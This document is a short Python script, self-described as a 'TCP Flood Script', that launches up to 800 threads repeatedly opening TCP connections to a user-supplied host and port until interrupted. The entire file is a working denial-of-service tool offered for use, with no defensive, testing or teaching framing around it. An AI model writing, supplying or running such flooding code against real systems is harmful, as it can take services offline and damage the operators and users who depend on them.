import socket
import threading
import sys

def flood(host, port, event):
    event.wait()
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            try:
                s.connect_ex((host, port))
                s.close()
            except:
                s.close()
        except:
            s.close()

if len(sys.argv) !=4:
    print("\nTCP Flood Script Code By 413xPr06605\n\nUsage : %s <host/ip> <port> <thread>"%(sys.argv[0]))
    sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])
thr = int(sys.argv[3])
if thr > 800:
    thr = 800
event = threading.Event()
for _ in range(thr):
    threading.Thread(target=flood, args=(host, port, event, )).start()
event.set()
while 1:
    try:
        input("Flooding . . . ")
    except KeyboardInterrupt:
        sys.exit()